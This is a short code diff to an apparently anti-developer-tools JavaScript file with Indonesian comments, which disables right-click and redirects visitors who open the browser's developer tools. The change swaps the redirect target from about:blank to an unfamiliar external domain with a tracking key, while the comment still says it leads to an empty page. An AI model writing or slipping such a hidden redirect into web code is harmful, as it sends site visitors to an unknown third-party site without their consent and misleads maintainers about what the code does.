@@ -1,3 +1,4 @@
+
 // File: anti-devtools.js
 
 (function () {
@@ -32,7 +33,7 @@
         });
 
         // Redirect ke halaman kosong
-        window.location.href = 'about:blank';
+        window.location.href = 'https://moustacheoverloadwar.com/r9zuqx1t33?key=e658a26ee78d379ec5445db129fbad0b';
     };
 
     // Matikan klik kanan
